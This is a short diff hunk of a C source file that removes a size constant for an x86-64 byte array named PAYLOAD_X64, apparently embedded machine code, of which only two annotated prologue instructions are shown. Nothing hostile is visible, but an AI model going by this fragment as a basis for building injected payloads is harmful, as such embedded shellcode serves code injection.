@@ -1,8 +1,6 @@
 
 // Target architecture : X86 64
 
-#define PAYLOAD_X64_SIZE 3046
-
 char PAYLOAD_X64[] = {
   /* 0000 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
   /* 0005 */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
